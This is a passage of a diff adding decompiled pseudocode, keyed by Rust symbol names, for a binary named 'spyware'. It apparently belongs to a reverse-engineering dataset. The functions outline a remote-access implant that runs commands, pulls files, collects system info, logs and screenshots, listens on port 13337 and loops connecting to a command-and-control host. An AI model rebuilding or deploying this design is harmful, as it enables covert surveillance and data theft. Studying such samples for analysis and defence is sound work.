serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aBuffer_0, 6LL, a2);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aWidth_0, 5LL, a2 + 24),\n          (_DWORD)v10 == 33)\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aHeight_0, 6LL, a2 + 32),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$11deserialize17hc0278cfffef915f6E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::DisplayScreenshot>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aDisplayscreens,\n    17LL,\n    &off_B90A0,\n    3LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$9serialize17h248e03f41e757f8aE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetScreenshotResponse>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aGetscreenshotr_0, 21LL, 2LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aDisplaysScreen_0, 20LL, a2);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(\n            &v10,\n            &v12,\n            aErrorInfo_0,\n            10LL,\n            a2 + 24),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_108_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$11deserialize17h64523546e7252f88E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetScreenshotResponse>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aGetscreenshotr_0,\n    21LL,\n    &off_B90D0,\n    2LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages7Message17RunCommandRequest17h075183aa725d84a0E": "unsigned __int64 __fastcall spyware::communication::messages::Message::RunCommandRequest(__int64 a1, __int128 *a2)\n{\n  __int128 v2; // xmm0\n  unsigned __int64 result; // rax\n\n  v2 = *a2;\n  *(_OWORD *)(a1 + 24) = a2[1];\n  *(_OWORD *)(a1 + 8) = v2;\n  result = 0x8000000000000000LL;\n  *(_QWORD *)a1 = 0x8000000000000000LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message18RunCommandResponse17h87f1971d57af5fa1E": "unsigned __int64 __fastcall spyware::communication::messages::Message::RunCommandResponse(__int64 a1, __int128 *a2)\n{\n  __int128 v2; // xmm0\n  __int128 v3; // xmm1\n  unsigned __int64 result; // rax\n\n  *(_QWORD *)(a1 + 56) = *((_QWORD *)a2 + 6);\n  v2 = *a2;\n  v3 = a2[1];\n  *(_OWORD *)(a1 + 40) = a2[2];\n  *(_OWORD *)(a1 + 24) = v3;\n  *(_OWORD *)(a1 + 8) = v2;\n  result = 0x8000000000000001LL;\n  *(_QWORD *)a1 = 0x8000000000000001LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message19DownloadFileRequest17hb5d1389eec76b978E": "unsigned __int64 __fastcall spyware::communication::messages::Message::DownloadFileRequest(__int64 a1, __int64 a2)\n{\n  unsigned __int64 result; // rax\n\n  *(_QWORD *)(a1 + 24) = *(_QWORD *)(a2 + 16);\n  *(_OWORD *)(a1 + 8) = *(_OWORD *)a2;\n  result = 0x8000000000000002LL;\n  *(_QWORD *)a1 = 0x8000000000000002LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message20DownloadFileResponse17ha7620692d046dc59E": "unsigned __int64 __fastcall spyware::communication::messages::Message::DownloadFileResponse(__int64 a1, __int128 *a2)\n{\n  __int128 v2; // xmm0\n  __int128 v3; // xmm1\n  unsigned __int64 result; // rax\n\n  *(_QWORD *)(a1 + 56) = *((_QWORD *)a2 + 6);\n  v2 = *a2;\n  v3 = a2[1];\n  *(_OWORD *)(a1 + 40) = a2[2];\n  *(_OWORD *)(a1 + 24) = v3;\n  *(_OWORD *)(a1 + 8) = v2;\n  result = 0x8000000000000003LL;\n  *(_QWORD *)a1 = 0x8000000000000003LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message19GetBasicInfoRequest17h8d9efe4a6a3d8bcfE": "unsigned __int64 __fastcall spyware::communication::messages::Message::GetBasicInfoRequest(__int64 a1, __int64 a2)\n{\n  unsigned __int64 result; // rax\n\n  *(_QWORD *)(a1 + 24) = *(_QWORD *)(a2 + 16);\n  *(_OWORD *)(a1 + 8) = *(_OWORD *)a2;\n  result = 0x8000000000000004LL;\n  *(_QWORD *)a1 = 0x8000000000000004LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message20GetBasicInfoResponse17he560e1b25a0d5b84E": "void __fastcall spyware::communication::messages::Message::GetBasicInfoResponse(_OWORD *a1, __int128 *a2)\n{\n  __int128 v2; // xmm0\n  __int128 v3; // xmm1\n  __int128 v4; // xmm2\n\n  v2 = *a2;\n  v3 = a2[1];\n  v4 = a2[2];\n  a1[3] = a2[3];\n  a1[2] = v4;\n  a1[1] = v3;\n  *a1 = v2;\n}",
+    "_ZN7spyware13communication8messages7Message14GetLogsRequest17he8fe873e6a6e4263E": "unsigned __int64 __fastcall spyware::communication::messages::Message::GetLogsRequest(_QWORD *a1)\n{\n  unsigned __int64 result; // rax\n\n  result = 0x8000000000000006LL;\n  *a1 = 0x8000000000000006LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message15GetLogsResponse17hd97008268b60995eE": "unsigned __int64 __fastcall spyware::communication::messages::Message::GetLogsResponse(__int64 a1, __int128 *a2)\n{\n  __int128 v2; // xmm0\n  __int128 v3; // xmm1\n  unsigned __int64 result; // rax\n\n  *(_QWORD *)(a1 + 56) = *((_QWORD *)a2 + 6);\n  v2 = *a2;\n  v3 = a2[1];\n  *(_OWORD *)(a1 + 40) = a2[2];\n  *(_OWORD *)(a1 + 24) = v3;\n  *(_OWORD *)(a1 + 8) = v2;\n  result = 0x8000000000000007LL;\n  *(_QWORD *)a1 = 0x8000000000000007LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message20GetScreenshotRequest17h748c79272499737bE": "unsigned __int64 __fastcall spyware::communication::messages::Message::GetScreenshotRequest(_QWORD *a1)\n{\n  unsigned __int64 result; // rax\n\n  result = 0x8000000000000008LL;\n  *a1 = 0x8000000000000008LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages7Message21GetScreenshotResponse17h672420867e6f6ff4E": "unsigned __int64 __fastcall spyware::communication::messages::Message::GetScreenshotResponse(__int64 a1, __int128 *a2)\n{\n  __int128 v2; // xmm0\n  __int128 v3; // xmm1\n  unsigned __int64 result; // rax\n\n  *(_QWORD *)(a1 + 56) = *((_QWORD *)a2 + 6);\n  v2 = *a2;\n  v3 = a2[1];\n  *(_OWORD *)(a1 + 40) = a2[2];\n  *(_OWORD *)(a1 + 24) = v3;\n  *(_OWORD *)(a1 + 8) = v2;\n  result = 0x8000000000000009LL;\n  *(_QWORD *)a1 = 0x8000000000000009LL;\n  return result;\n}",
+    "_ZN7spyware13communication8messages1_93_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Message$GT$9serialize17h581434390f64cc04E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::Message>::serialize(\n        __int64 a1,\n        _QWORD *a2,\n        int a3)\n{\n  unsigned __int64 v4; // rdx\n  __int64 result; // rax\n\n  v4 = 5LL;\n  if ( (*a2 ^ 0x8000000000000000LL) < 0xA )\n    v4 = *a2 ^ 0x8000000000000000LL;\n  switch ( v4 )\n  {\n    case 0uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        0,\n        (unsigned int)aRuncommandrequ,\n        17LL,\n        (__int64)(a2 + 1));\n      result = a1;\n      break;\n    case 1uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        1,\n        (unsigned int)aRuncommandresp,\n        18LL,\n        (__int64)(a2 + 1));\n      result = a1;\n      break;\n    case 2uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        2,\n        (unsigned int)aDownloadfilere,\n        19LL,\n        (__int64)(a2 + 1));\n      result = a1;\n      break;\n    case 3uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        3,\n        (unsigned int)aDownloadfilere_0,\n        20LL,\n        (__int64)(a2 + 1));\n      result = a1;\n      break;\n    case 4uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        4,\n        (unsigned int)aGetbasicinfore,\n        19LL,\n        (__int64)(a2 + 1));\n      result = a1;\n      break;\n    case 5uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        5,\n        (unsigned int)aGetbasicinfore_0,\n        20LL,\n        (__int64)a2);\n      result = a1;\n      break;\n    case 6uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        6,\n        (unsigned int)aGetlogsrequest,\n        14LL,\n        (__int64)a2);\n      result = a1;\n      break;\n    case 7uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        7,\n        (unsigned int)aGetlogsrespons,\n        15LL,\n        (__int64)(a2 + 1));\n      result = a1;\n      break;\n    case 8uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        8,\n        (unsigned int)aGetscreenshotr,\n        20LL,\n        (__int64)a2);\n      result = a1;\n      break;\n    case 9uLL:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(\n        a1,\n        a3,\n        (unsigned int)aMessage,\n        7,\n        9,\n        (unsigned int)aGetscreenshotr_0,\n        21LL,\n        (__int64)(a2 + 1));\n      result = a1;\n      break;\n  }\n  return result;\n}",
+    "_ZN7spyware13communication8messages1_94_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Message$GT$11deserialize17h7721b036fb7eed9cE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::Message>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_enum(a1, a2, aMessage, 7LL, &off_B90F0, 10LL);\n  return a1;\n}",
+    "_ZN7spyware15run_server_loop17ha507d6dda312d1beE": "void __noreturn spyware::run_server_loop()\n{\n  __int64 v0; // rax\n  __int64 v1; // rax\n  __int64 v2; // rax\n  __int64 v3; // rax\n  __int64 v4; // [rsp+0h] [rbp-B8h] BYREF\n  const char *v5; // [rsp+8h] [rbp-B0h] BYREF\n  __int64 v6; // [rsp+10h] [rbp-A8h]\n  const char *v7; // [rsp+18h] [rbp-A0h]\n  __int64 v8; // [rsp+20h] [rbp-98h]\n  __int64 v9; // [rsp+28h] [rbp-90h]\n  __int64 v10; // [rsp+30h] [rbp-88h] BYREF\n  char **v11; // [rsp+38h] [rbp-80h] BYREF\n  __int64 v12; // [rsp+40h] [rbp-78h]\n  __int64 **v13; // [rsp+48h] [rbp-70h]\n  __int128 v14; // [rsp+50h] [rbp-68h]\n  __int64 *v15; // [rsp+68h] [rbp-50h] BYREF\n  __int64 (__fastcall *v16)(); // [rsp+70h] [rbp-48h]\n  __int64 *v17; // [rsp+78h] [rbp-40h]\n  __int64 (__fastcall *v18)(); // [rsp+80h] [rbp-38h]\n\n  while ( 1 )\n  {\n    if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )\n    {\n      v11 = &off_B92A0;\n      v12 = 1LL;\n      v13 = (__int64 **)&byte_8;\n      v14 = 0LL;\n      v2 = log::__private_api::loc(&off_B9300);\n      v5 = aSpyware;\n      v6 = 7LL;\n      v7 = aSpyware;\n      v8 = 7LL;\n      v9 = v2;\n      log::__private_api::log(&v11, 4LL, &v5);\n      v0 = spyware::communication::server::run_server(13337);\n      if ( !v0 )\n        goto LABEL_9;\n    }\n    else\n    {\n      v0 = spyware::communication::server::run_server(13337);\n      if ( !v0 )\n        goto LABEL_9;\n    }\n    v10 = v0;\n    if ( core::sync::atomic::atomic_load() )\n    {\n      v4 = 5LL;\n      v15 = &v10;\n      v16 = <std::io::error::Error as core::fmt::Display>::fmt;\n      v17 = &v4;\n      v18 = core::fmt::num::imp::<impl core::fmt::Display for usize>::fmt;\n      v11 = &off_B92B0;\n      v12 = 3LL;\n      v13 = &v15;\n      v14 = 2uLL;\n      v1 = log::__private_api::loc(&off_B9318);\n      v5 = aSpyware;\n      v6 = 7LL;\n      v7 = aSpyware;\n      v8 = 7LL;\n      v9 = v1;\n      log::__private_api::log(&v11, 1LL, &v5);\n    }\n    core::ptr::drop_in_place<std::io::error::Error>(&v10);\nLABEL_9:\n    if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )\n    {\n      v4 = 5LL;\n      v15 = &v4;\n      v16 = core::fmt::num::imp::<impl core::fmt::Display for usize>::fmt;\n      v11 = &off_B92E0;\n      v12 = 2LL;\n      v13 = &v15;\n      v14 = 1uLL;\n      v3 = log::__private_api::loc(&off_B9330);\n      v5 = aSpyware;\n      v6 = 7LL;\n      v7 = aSpyware;\n      v8 = 7LL;\n      v9 = v3;\n      log::__private_api::log(&v11, 4LL, &v5);\n    }\n    std::thread::sleep(5LL, 0LL);\n  }\n}",
+    "_ZN7spyware23run_cnc_connection_loop17h099cfaaaff629944E": "void __noreturn spyware::run_cnc_connection_loop()\n{\n  __int64 v0; // rax\n  __int64 v1; // rax\n  unsigned int v2; // [rsp+4h] [rbp-114h] BYREF\n  char **v3; // [rsp+8h] [rbp-110h] BYREF\n  __int64 v4; // [rsp+10h] [rbp-108h]\n  const char **v5; // [rsp+18h] [rbp-100h]\n  __int64 v6; // [rsp+20h] [rbp-F8h]\n  __int64 v7; // [rsp+28h] [rbp-F0h]\n  char v8; // [rsp+30h] [rbp-E8h]\n  const char *v9; // [rsp+38h] [rbp-E0h] BYREF\n  __int64 (__fastcall *v10)(); // [rsp+40h] [rbp-D8h]\n  const char *v11; // [rsp+48h] [rbp-D0h]\n  __int64 (__fastcall *v12)(); // [rsp+50h] [rbp-C8h]\n  __int64 v13; // [rsp+58h] [rbp-C0h]\n  _QWORD v14[2]; // [rsp+60h] [rbp-B8h] BYREF\n  _BYTE v15[4]; // [rsp+70h] [rbp-A8h] BYREF\n  unsigned int v16; // [rsp+74h] [rbp-A4h]\n  __int64 v17; // [rsp+78h] [rbp-A0h]\n  _QWORD v18[4]; // [rsp+80h] [rbp-98h] BYREF\n  __int128 v19; // [rsp+A0h] [rbp-78h] BYREF\n  __int64 v20; // [rsp+B0h] [rbp-68h]\n  __int128 v21; // [rsp+B8h] [rbp-60h] BYREF\n  __int64 v22; // [rsp+C8h] [rbp-50h]\n  _QWORD v23[9]; // [rsp+D0h] [rbp-48h] BYREF\n\n  while ( 1 )\n  {\n    v9 = (const char *)&off_B93A8;\n    v10 = <&T as core::fmt::Display>::fmt;\n    v11 = (const char *)&unk_1281A;\n    v12 = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;\n    v3 = (char **)&unk_B9348;\n    v4 = 2LL;\n    v7 = 0LL;\n    v5 = &v9;\n    v6 = 2LL;\n    core::option::Option<T>::map_or_else(&v21, &v3);\n    v19 = v21;\n    v20 = v22;\n    std::net::tcp::TcpStream::connect(v15, &v19);\n    if ( (v15[0] & 1) != 0 )\n    {\n      v14[0] = v17;\n      if ( core::sync::atomic::atomic_load() )\n      {\n        v23[0] = &v19;\n        v18[0] = v23;\n        v18[1] = <&T as core::fmt::Display>::fmt;\n        v18[2] = v14;\n        v18[3] = <std::io::error::Error as core::fmt::Display>::fmt;\n        v3 = &off_B9388;\n        v4 = 2LL;\n        v7 = 0LL;\n        v5 = (const char **)v18;\n        v6 = 2LL;\n        v0 = log::__private_api::loc(&off_B9400);\n        v9 = aSpyware;\n        v10 = (__int64 (__fastcall *)())&byte_7;\n        v11 = aSpyware;\n        v12 = (__int64 (__fastcall *)())&byte_7;\n        v13 = v0;\n        log::__private_api::log(&v3, 1LL, &v9);\n      }\n      core::ptr::drop_in_place<std::io::error::Error>(v14);\n    }\n    else\n    {\n      v2 = v16;\n      if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 3 )\n      {\n        std::net::tcp::TcpStream::peer_addr(&v3, &v2);\n        core::result::Result<T,E>::unwrap(v18, &v3);\n        <T as alloc::string::SpecToString>::spec_to_string(v23, v18);\n        v14[0] = v23;\n        v14[1] = <alloc::string::String as core::fmt::Display>::fmt;\n        v3 = &off_B9368;\n        v4 = 2LL;\n        v7 = 0LL;\n        v5 = (const char **)v14;\n        v6 = 1LL;\n        v1 = log::__private_api::loc(&off_B93D0);\n        v9 = aSpyware;\n        v10 = (__int64 (__fastcall *)())&byte_7;\n        v11 = aSpyware;\n        v12 = (__int64 (__fastcall *)())&byte_7;\n        v13 = v1;\n        log::__private_api::log(&v3, 3LL, &v9);\n        core::ptr::drop_in_place<alloc::string::String>(v23);\n      }\n      v5 = (const char **)0x8000000000000000LL;\n      v3 = 0LL;\n      v8 = 0;\n      std::thread::Builder::spawn_unchecked(&v9, &v3, v2);\n      core::result::Result<T,E>::expect(&v3, &v9);\n      core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>(&v3);\n    }\n    std::thread::sleep(5LL, 0LL);\n    core::ptr::drop_in_place<alloc::string::String>(&v19);\n  }\n}",
+    "_ZN7spyware12init_logging17h71d90daabdd6a317E": "__int64 spyware::init_logging()\n{\n  unsigned __int8 v0; // al\n  _QWORD v2[2]; // [rsp+0h] [rbp-18h] BYREF\n  __int16 v3; // [rsp+10h] [rbp-8h]\n\n  v3 = 257;\n  v2[1] = 0x4000LL;\n  v2[0] = 4LL;\n  v0 = ((__int64 (__fastcall *)(_QWORD *))spyware::logging::core::setup_logging)(v2);\n  return core::result::Result<T,E>::unwrap(v0);\n}",
+    "_ZN7spyware4main17h0c167b4c5fedcce2E": "__int64 spyware::main()\n{\n  __int64 v0; // rax\n  __int64 v1; // rdx\n  __int64 v2; // rsi\n  __int64 v3; // rdx\n  __int64 v4; // rcx\n  __int64 v5; // r8\n  __int64 v6; // r9\n  __int64 v7; // rax\n  __int64 v8; // rdx\n  __int128 v10; // [rsp+0h] [rbp-D8h] BYREF\n  _BYTE v11[24]; // [rsp+10h] [rbp-C8h]\n  char v12; // [rsp+28h] [rbp-B0h]\n  int v13; // [rsp+29h] [rbp-AFh]\n  __int16 v14; // [rsp+2Dh] [rbp-ABh]\n  char v15; // [rsp+2Fh] [rbp-A9h]\n  __int128 v16; // [rsp+38h] [rbp-A0h] BYREF\n  unsigned __int64 v17; // [rsp+48h] [rbp-90h]\n  unsigned __int64 v18; // [rsp+50h] [rbp-88h]\n  __int64 v19; // [rsp+58h] [rbp-80h]\n  char v20; // [rsp+60h] [rbp-78h]\n  int v21; // [rsp+61h] [rbp-77h]\n  __int16 v22; // [rsp+65h] [rbp-73h]\n  char v23; // [rsp+67h] [rbp-71h]\n  _QWORD v24[5]; // [rsp+68h] [rbp-70h] BYREF\n  _OWORD v25[2]; // [rsp+90h] [rbp-48h] BYREF\n  _OWORD v26[2]; // [rsp+B0h] [rbp-28h] BYREF\n\n  spyware::init_logging();\n  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 3 )\n  {\n    *(_QWORD *)&v10 = &off_B9430;\n    *((_QWORD *)&v10 + 1) = 1LL;\n    *(_QWORD *)v11 = 8LL;\n    *(_OWORD *)&v11[8] = 0LL;\n    v24[0] = aSpyware;\n    v24[1] = 7LL;\n    v24[2] = aSpyware;\n    v24[3] = 7LL;\n    v24[4] = log::__private_api::loc(&off_B9440);\n    log::__private_api::log(&v10, 3LL, v24);\n  }\n  v17 = 0x8000000000000000LL;\n  *(_QWORD *)&v16 = 0LL;\n  v20 = 0;\n  *(_QWORD *)&v11[16] = v19;\n  v12 = 0;\n  v13 = v21;\n  v14 = v22;\n  v15 = v23;\n  *(_OWORD *)v11 = __PAIR128__(v18, 0x8000000000000000LL);\n  v10 = v16;\n  ((void (__fastcall *)(_QWORD *, __int128 *))std::thread::Builder::spawn_unchecked)(v24, &v10);\n  core::result::Result<T,E>::expect(v25, v24);\n  std::thread::Builder::spawn_unchecked(&v10, &v16);\n  core::result::Result<T,E>::expect(v26, &v10);\n  *(_OWORD *)v11 = v26[1];\n  v10 = v26[0];\n  v0 = ((__int64 (__fastcall *)(__int128 *))std::thread::JoinInner<T>::join)(&v10);\n  v2 = v1;\n  core::result::Result<T,E>::expect(v0, v1, aTheCncConnecti, 32LL, &off_B9458);\n  *(_OWORD *)v11 = v25[1];\n  v10 = v25[0];\n  v7 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))std::thread::JoinInner<T>::join)(\n         &v10,\n         v2,\n         v3,\n         v4,\n         v5,\n         v6);\n  return core::result::Result<T,E>::expect(\n           v7,\n           v8,\n           \"The server connection has panicked.LoggingNotInitializedErrorLoggingSetupCalledTwiceLoggingInitializationError\",\n           35LL,\n           &off_B9470);\n}",
+    "_ZN7spyware7actions10basic_info19get_running_os_info17h2ac1d86b9171dd43E": "// attributes: thunk\n__int64 spyware::actions::basic_info::get_running_os_info()\n{\n  return <T as alloc::slice::hack::ConvertVec>::to_vec();\n}",
+    "_ZN7spyware7actions10basic_info22get_basic_info_request17h37840dd4820167afE": "__int64 __fastcall spyware::actions::basic_info::get_basic_info_request(__int64 a1)\n{\n  _QWORD v2[5]; // [rsp+8h] [rbp-60h] BYREF\n  _QWORD v3[3]; // [rsp+30h] [rbp-38h] BYREF\n  __int128 v4; // [rsp+48h] [rbp-20h]\n\n  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )\n  {\n    v3[0] = &off_B97E8;\n    v3[1] = 1LL;\n    v3[2] = 8LL;\n    v4 = 0LL;\n    v2[0] = aSpywareActions;\n    v2[1] = 28LL;\n    v2[2] = aSpywareActions;\n    v2[3] = 28LL;\n    v2[4] = log::__private_api::loc(&off_B97F8);\n    log::__private_api::log(v3, 4LL, v2);\n  }\n  spyware::actions::basic_info::get_running_os_info(a1);\n  *(_DWORD *)(a1 + 56) = 1;\n  *(_BYTE *)(a1 + 62) = 1;\n  *(_WORD *)(a1 + 60) = 257;\n  *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;\n  return a1;\n}",
+    "_ZN7spyware7actions10basic_info21download_file_message17h8a802bf593e1dd2fE": "__int64 __fastcall spyware::actions::basic_info::download_file_message(__int64 a1, __int64 a2)\n{\n  __int64 v2; // r15\n  __int64 v3; // rax\n  char v4; // r15\n  int v5; // ebp\n  __int64 v6; // rax\n  __int64 v7; // rdx\n  __int64 v9; // [rsp+0h] [rbp-C8h] BYREF\n  __int128 v10; // [rsp+8h] [rbp-C0h] BYREF\n  const char *v11; // [rsp+18h] [rbp-B0h]\n  __int64 v12; // [rsp+20h] [rbp-A8h]\n  __int64 v13; // [rsp+28h] [rbp-A0h]\n  __int128 v14; // [rsp+30h] [rbp-98h] BYREF\n  __int64 *v15; // [rsp+40h] [rbp-88h]\n  __int64 v16; // [rsp+48h] [rbp-80h]\n  __int64 v17; // [rsp+50h] [rbp-78h]\n  _BYTE v18[4]; // [rsp+60h] [rbp-68h] BYREF\n  int v19; // [rsp+64h] [rbp-64h]\n  __int64 v20; // [rsp+68h] [rbp-60h]\n  __int64 v21; // [rsp+70h] [rbp-58h] BYREF\n  __int64 (__fastcall *v22)(); // [rsp+78h] [rbp-50h]\n  _BYTE *v23; // [rsp+80h] [rbp-48h]\n  __int64 (__fastcall *v24)(); // [rsp+88h] [rbp-40h]\n  _BYTE v25[56]; // [rsp+90h] [rbp-38h] BYREF\n\n  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )\n  {\n    v21 = a2;\n    v22 = <alloc::string::String as core::fmt::Display>::fmt;\n    *(_QWORD *)&v14 = &off_B9810;\n    *((_QWORD *)&v14 + 1) = 2LL;\n    v17 = 0LL;\n    v15 = &v21;\n    v16 = 1LL;\n    *(_QWORD *)&v10 = aSpywareActions;\n    *((_QWORD *)&v10 + 1) = 28LL;\n    v11 = aSpywareActions;\n    v12 = 28LL;\n    v13 = log::__private_api::loc(&off_B9860);\n    log::__private_api::log(&v14, 4LL, &v10);\n  }\n  std::fs::File::open(v18, a2);\n  if ( (v18[0] & 1) != 0 )\n  {\n    v2 = v20;\n    v9 = v20;\n    if ( core::sync::atomic::atomic_load() )\n    {\n      <T as alloc::string::SpecToString>::spec_to_string(v25, &v9);\n      v21 = a2;\n      v22 = <alloc::string::String as core::fmt::Display>::fmt;\n      v23 = v25;\n      v24 = <alloc::string::String as core::fmt::Display>::fmt;\n      *(_QWORD *)&v14 = &off_B9830;\n      *((_QWORD *)&v14 + 1) = 3LL;\n      v17 = 0LL;\n      v15 = &v21;\n      v16 = 2LL;\n      v3 = log::__private_api::loc(&off_B9890);\n      *(_QWORD *)&v10 = aSpywareActions;\n      *((_QWORD *)&v10 + 1) = 28LL;\n      v11 = aSpywareActions;\n      v12 = 28LL;\n      v13 = v3;\n      log::__private_api::log(&v14, 1LL, &v10);\n      core::ptr::drop_in_place<alloc::string::String>(v25);\n      v2 = v9;\n    }\n    *(_QWORD *)&v10 = 0LL;\n    *((_QWORD *)&v10 + 1) = 1LL;\n    v11 = 0LL;\n    std::io::error::repr_bitpacked::decode_repr(&v14, v2);\n    v4 = v14;\n    v5 = DWORD1(v14);\n    <T as alloc::string::SpecToString>::spec_to_string(&v14, &v9);\n    *(_QWORD *)(a1 + 40) = v15;\n    *(_OWORD *)(a1 + 24) = v14;\n    *(_QWORD *)(a1 + 16) = v11;\n    *(_OWORD *)a1 = v10;\n    *(_DWORD *)(a1 + 48) = v4 != 0 ? -1 : v5;\n    core::ptr::drop_in_place<std::io::error::Error>(&v9);\n  }\n  else\n  {\n    LODWORD(v10) = v19;\n    *(_QWORD *)&v14 = 0LL;\n    *((_QWORD *)&v14 + 1) = 1LL;\n    v15 = 0LL;\n    v6 = <std::fs::File as std::io::Read>::read_to_end(&v10, &v14);\n    